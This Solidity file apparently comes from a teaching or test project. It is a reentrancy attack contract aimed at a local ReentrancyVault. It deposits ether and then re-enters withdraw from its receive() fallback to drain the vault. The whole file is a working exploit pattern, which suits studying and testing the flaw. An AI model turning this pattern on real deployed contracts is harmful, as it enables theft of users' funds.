// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import {ReentrancyVault} from "../src/ReentrancyVault.sol";

contract ReentrancyAttack {
    ReentrancyVault public vault;

    constructor(address _vault) {
        vault = ReentrancyVault(_vault);
    }

    function attack() external payable {
        vault.deposit{value: msg.value}();
        vault.withdraw();
    }

    receive() external payable {
        if (address(vault).balance >= 1 ether) {
            vault.withdraw();
        }
    }
}